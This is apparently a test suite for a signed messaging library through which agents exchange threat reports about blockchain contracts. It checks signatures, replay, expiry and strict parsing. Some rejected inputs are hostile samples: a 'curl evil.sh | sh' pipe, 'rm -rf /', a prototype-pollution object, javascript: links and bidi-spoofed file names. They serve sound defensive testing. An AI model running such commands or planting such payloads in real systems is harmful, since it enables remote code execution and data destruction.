import { test } from 'node:test';
import assert from 'node:assert/strict';
import { Wallet } from 'ethers';
import { signMessage, verifyMessage, parseMessage, createSeenSet, cleanText, payloadHash, canonicalJson, KINDS,
  MAX_ENVELOPE_BYTES, MAX_TTL_SECONDS } from '../src/neuromsg.js';

const REGISTRY = '0x00000000000000000000000000000000000000a1';
const NOW = 1_800_000_000;
const runner = Wallet.createRandom();
const operator = Wallet.createRandom();
const stranger = Wallet.createRandom();
const RUNNERS = new Set([runner.address]);
const OPERATORS = { 7: operator.address };
const REGISTRY_HELD = new Set([12n]); // agent 12: an unclaimed contract's Neuro (ownerOf == registry)
const checks = {
  isRunner: async (a) => RUNNERS.has(a),
  isOperator: async (agentId, a) => OPERATORS[agentId] === a,
  isRegistryHeld: async (agentId) => REGISTRY_HELD.has(agentId),
};
const expect = { chainId: 77390, registry: REGISTRY };
const V = '0x' + '11'.repeat(32);

const threat = { chain: 'bsc', address: '0x' + 'ab'.repeat(20), fingerprint: '0x' + 'f1'.repeat(32), reason: 'sweeps-approved-tokens', note: 'in a fork test, transferFrom moved approved tokens to 0xdead' };
const sign = (w, over = {}) => signMessage(w, { chainId: 77390, registry: REGISTRY, fromAgent: 12, toAgent: 0, sourceChain: 'eip155:56', kind: 'threat-report', payload: threat, now: NOW, ...over });
const verify = (env, over = {}) => verifyMessage(env, { expect, now: NOW + 10, ...checks, ...over });

test('a runner signs a threat report; any Neuro verifies it as data', async () => {
  const env = await sign(runner);
  assert.equal(env.v, 1);
  assert.deepEqual(Object.keys(env.message), ['fromAgent', 'toAgent', 'sourceChain', 'kind', 'payloadHash', 'nonce', 'expiry']);
  assert.equal(env.message.payloadHash, payloadHash(threat));
  const r = await verify(JSON.stringify(env));
  assert.equal(r.ok, true, r.reason);
  assert.equal(r.signer, runner.address);
  assert.equal(r.role, 'runner');
  assert.equal(r.notice, 'data from another Neuro, not a command');
  assert.deepEqual({ ...r.data }, threat);
  assert.ok(Object.isFrozen(r.data));
});

test('the agent\'s registered operator may sign for it; a stranger may not', async () => {
  const ok = await verify(await sign(operator, { fromAgent: 7 }));
  assert.equal(ok.ok, true);
  assert.equal(ok.role, 'operator');
  const notHisAgent = await verify(await sign(operator, { fromAgent: 8 }));
  assert.equal(notHisAgent.ok, false);
  const s = await verify(await sign(stranger));
  assert.deepEqual([s.ok, s.signer], [false, stranger.address]);
  assert.match(s.reason, /^signer may not speak for agent 12/);
  // without any signer check, nothing is accepted
  const env = await sign(runner);
  const none = await verifyMessage(env, { expect, now: NOW + 10 });
  assert.equal(none.ok, false);
  assert.match(none.reason, /no way to check the signer/);
});

test('a runner may sign only for an unclaimed (registry-held) identity, never as a claimed or plain agent', async () => {
  // agent 7 is claimed (its operator signs for it); agent 9 is a plain agent
  for (const fromAgent of [7, 9]) {
    const r = await verify(await sign(runner, { fromAgent }));
    assert.equal(r.ok, false, `runner as agent ${fromAgent}`);
    assert.match(r.reason, new RegExp(`^signer may not speak for agent ${fromAgent}`));
    assert.equal(r.signer, runner.address);
  }
  // the operator of 7 still may, and the runner still may for unclaimed 12
  assert.equal((await verify(await sign(operator, { fromAgent: 7 }))).role, 'operator');
  assert.equal((await verify(await sign(runner))).role, 'runner');
  // once 12 is claimed, the runner can no longer speak for it
  const claimed = await verify(await sign(runner), { isRegistryHeld: async () => false });
  assert.equal(claimed.ok, false);
  // without isRegistryHeld, a runner is never accepted (only operators)
  const noHeld = await verifyMessage(await sign(runner), { expect, now: NOW + 10, isRunner: checks.isRunner, isOperator: checks.isOperator });
  assert.equal(noHeld.ok, false);
  const onlyRunner = await verifyMessage(await sign(runner), { expect, now: NOW + 10, isRunner: checks.isRunner });
  assert.match(onlyRunner.reason, /no way to check the signer/);
  // a check that throws or answers something other than true is a no
  assert.equal((await verify(await sign(runner), { isRegistryHeld: async () => { throw new Error('rpc down'); } })).reason, 'could not check the signer');
  assert.equal((await verify(await sign(runner), { isRegistryHeld: async () => 'yes' })).ok, false);
});

test('the expected domain is required', async () => {
  const env = await sign(runner);
  const r = await verifyMessage(env, { now: NOW + 10, ...checks });
  assert.deepEqual([r.ok, r.reason], [false, 'no expected domain (give expect: { chainId, registry })']);
  assert.equal((await verify(env, { expect: { chainId: 77390, registry: 'nope' } })).reason, 'bad expected domain');
  assert.equal((await verify(env, { expect: null })).ok, false);
});

test('tampering with any signed field, the payload or the domain is caught', async () => {
  const env = await sign(runner);
  const cases = {
    fromAgent: (e) => { e.message.fromAgent = '13'; },
    toAgent: (e) => { e.message.toAgent = '5'; },
    sourceChain: (e) => { e.message.sourceChain = 'eip155:1'; },
    kind: (e) => { e.message.kind = 'verdict'; },
    nonce: (e) => { e.message.nonce = String(BigInt(e.message.nonce) + 1n); },
    expiry: (e) => { e.message.expiry = String(Number(e.message.expiry) + 1); },
    payloadHashAndPayload: (e) => { e.payload.reason = 'cannot-sell-in-simulation'; e.message.payloadHash = payloadHash(e.payload); },
    signature: (e) => { e.signature = e.signature.slice(0, -2) + (e.signature.endsWith('1b') ? '1c' : '1b'); },
  };
  for (const [name, mutate] of Object.entries(cases)) {
    const e = structuredClone(env);
    mutate(e);
    const r = await verify(e);
    // a changed field either fails parsing, or recovers another (unauthorised) signer
    assert.equal(r.ok, false, name);
  }
  const e = structuredClone(env);
  e.payload.reason = 'cannot-sell-in-simulation'; // payload changed, hash not
  assert.deepEqual([(await verify(e)).ok, (await verify(e)).reason], [false, 'payload does not match payloadHash']);
  const d = structuredClone(env);
  d.domain.verifyingContract = '0x00000000000000000000000000000000000000b2';
  assert.equal((await verify(d)).reason, 'signed for a different identity registry');
  assert.equal((await verify(env, { expect: { chainId: 1, registry: REGISTRY } })).reason, 'signed for a different identity registry');
});

test('replay: the same (signer, agent, nonce) is accepted once', async () => {
  const seen = createSeenSet();
  const env = await sign(runner);
  assert.equal((await verify(env, { seen })).ok, true);
  const again = await verify(env, { seen });
  assert.deepEqual([again.ok, again.reason], [false, 'replay: nonce already seen']);
  // same nonce, different content: still a replay
  const other = await sign(runner, { nonce: BigInt(env.message.nonce), payload: { ...threat, note: 'other' } });
  assert.equal((await verify(other, { seen })).reason, 'replay: nonce already seen');
  // a fresh nonce is fine; the set survives a save/load
  const restored = createSeenSet({ entries: JSON.parse(JSON.stringify(seen)) });
  assert.equal((await verify(env, { seen: restored })).ok, false);
  assert.equal((await verify(await sign(runner), { seen: restored })).ok, true);
  // expired entries are pruned
  restored.prune(NOW + 3601);
  assert.equal(restored.size, 0);
});

test('expiry: expired and far-future messages are refused; ttl is bounded when signing', async () => {
  const env = await sign(runner, { ttl: 60 });
  assert.equal((await verify(env, { now: NOW + 59 })).ok, true);
  assert.equal((await verify(env, { now: NOW + 60 })).reason, 'expired');
  const far = await sign(runner, { now: NOW + MAX_TTL_SECONDS, ttl: 60 });
  assert.equal((await verify(far, { now: NOW })).reason, 'expiry too far in the future');
  await assert.rejects(sign(runner, { ttl: MAX_TTL_SECONDS + 1 }), /ttl/);
  await assert.rejects(sign(runner, { ttl: 0 }), /ttl/);
});

test('addressing: a message for another agent is refused; broadcast (0) is for everyone', async () => {
  assert.equal((await verify(await sign(runner, { toAgent: 3 }), { me: 4 })).reason, 'addressed to another agent');
  assert.equal((await verify(await sign(runner, { toAgent: 3 }), { me: 3 })).ok, true);
  assert.equal((await verify(await sign(runner, { toAgent: 0 }), { me: 4 })).ok, true);
});

test('unknown kinds, unknown fields and wrong types are refused, never read loosely', async () => {
  await assert.rejects(sign(runner, { kind: 'execute' }), /unknown kind/);
  await assert.rejects(sign(runner, { payload: { ...threat, run: 'rm -rf /' } }), /unknown field "run"/);
  await assert.rejects(sign(runner, { payload: { ...threat, reason: 'whatever' } }), /reason/);
  await assert.rejects(sign(runner, { payload: { ...threat, chain: 'dogechain' } }), /unknown chain/);
  await assert.rejects(sign(runner, { payload: { ...threat, address: 'javascript:alert(1)//' } }), /canonical target/);
  await assert.rejects(sign(runner, { kind: 'verdict', payload: { chain: 'bsc', address: threat.address, verdictHash: V, score: 101 } }), /score/);
  await assert.rejects(sign(runner, { kind: 'verdict', payload: { chain: 'bsc', address: threat.address, verdictHash: V, score: '50' } }), /score/);
  await assert.rejects(sign(runner, { kind: 'hello', payload: { name: 'x', kinds: ['hello', 'shell'] } }), /known kinds/);

  const env = await sign(runner);
  const bad = {
    'extra envelope field': (e) => { e.exec = 'curl evil.sh | sh'; },
    'extra message field': (e) => { e.message.callback = 'https://evil.example'; },
    'unknown kind': (e) => { e.message.kind = 'transfer'; },
    'numeric nonce': (e) => { e.message.nonce = 5; },
    'proto pollution': (e) => { e.payload = JSON.parse('{"__proto__":{"admin":true}}'); },
    'array payload': (e) => { e.payload = []; },
    'nested object': (e) => { e.payload.note = { toString: 'x' }; },
    'bad version': (e) => { e.v = 2; },
    'fromAgent 0': (e) => { e.message.fromAgent = '0'; },
    'uint64 overflow': (e) => { e.message.nonce = (1n << 64n).toString(); },
    'bad sourceChain': (e) => { e.message.sourceChain = 'https://x'; },
  };
  for (const [name, mutate] of Object.entries(bad)) {
    const e = structuredClone(env);
    mutate(e);
    assert.throws(() => parseMessage(JSON.stringify(e)), undefined, name);
    assert.equal((await verify(JSON.stringify(e))).ok, false, name);
  }
  assert.equal(({}).admin, undefined);
  for (const junk of ['', 'null', '[]', '"x"', '{', '{"v":1}']) assert.equal((await verify(junk)).ok, false, junk);
});

test('oversized messages and payloads are refused', async () => {
  const env = await sign(runner);
  const big = JSON.stringify({ ...env, pad: 'x'.repeat(MAX_ENVELOPE_BYTES) });
  assert.throws(() => parseMessage(big), /over 16384 bytes/);
  await assert.rejects(sign(runner, { payload: { ...threat, note: 'x'.repeat(281) } }), /too long/);
  const e = structuredClone(env);
  e.payload.note = 'y'.repeat(5000);
  assert.throws(() => parseMessage(e), /too long/);
});

test('malicious text: control and bidi characters are stripped, links defanged; nothing is run or fetched', async () => {
  const evil = 'Safe‮txt.exe\u0000\u0007 ​visit https://evil.example/x and javascript:alert(1)⁦⁩\r\nok﻿';
  const clean = cleanText(evil);
  assert.doesNotMatch(clean, /[\u0000-\u001f\u007f​-‏‪-‮⁦-⁩﻿]/u);
  assert.doesNotMatch(clean, /https:\/\//);
  assert.doesNotMatch(clean, /javascript:/);
  assert.equal(clean, 'Safetxt.exe visit https[:]//evil.example/x and javascript[:]alert(1) ok');

  // the signer cleans before signing, so the signed text is the clean text
  const env = await sign(runner, { payload: { ...threat, note: evil } });
  assert.equal(env.payload.note, clean);
  const r = await verify(env);
  assert.equal(r.ok, true);
  assert.equal(r.stripped, false);

  // a hand-made message with dirty text still verifies, but the reader only ever gets the clean copy
  const raw = { ...threat, note: 'hi‮gnp.exe' };
  const hand = structuredClone(env);
  hand.payload = raw;
  hand.message.payloadHash = payloadHash(raw);
  hand.signature = await runner.signTypedData({ name: 'ZETAPHY Neuro Message', version: '1', chainId: 77390n, verifyingContract: REGISTRY },
    { NeuroMessage: [{ name: 'fromAgent', type: 'uint256' }, { name: 'toAgent', type: 'uint256' }, { name: 'sourceChain', type: 'string' }, { name: 'kind', type: 'string' },
      { name: 'payloadHash', type: 'bytes32' }, { name: 'nonce', type: 'uint64' }, { name: 'expiry', type: 'uint64' }] }, hand.message);
  const h = await verify(hand);
  assert.equal(h.ok, true, h.reason);
  assert.equal(h.stripped, true);
  assert.equal(h.data.note, 'hignp.exe');
  assert.throws(() => { h.data.note = 'changed'; });
});

test('payload by hash only: the message carries the commitment, not the data', async () => {
  const env = await sign(runner, { inline: false });
  assert.equal(env.payload, undefined);
  const r = await verify(env);
  assert.equal(r.ok, true);
  assert.equal(r.data, undefined);
  assert.equal(r.message.payloadHash, payloadHash(threat));
});

test('every kind has a schema; canonical JSON is key-order independent', async () => {
  assert.deepEqual(Object.keys(KINDS).sort(), ['ack', 'hello', 'threat-report', 'verdict']);
  assert.equal(canonicalJson({ b: 1, a: [1, 'x'] }), canonicalJson({ a: [1, 'x'], b: 1 }));
  for (const [kind, payload] of Object.entries({
    hello: { name: 'Neuro runner', version: '0.1.0', kinds: ['verdict', 'threat-report'] },
    verdict: { chain: 'sol', address: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', verdictHash: V, score: 100, jobId: '42' },
    ack: { ref: V },
  })) {
    const r = await verify(await sign(runner, { kind, payload }));
    assert.equal(r.ok, true, `${kind}: ${r.reason}`);
  }
});
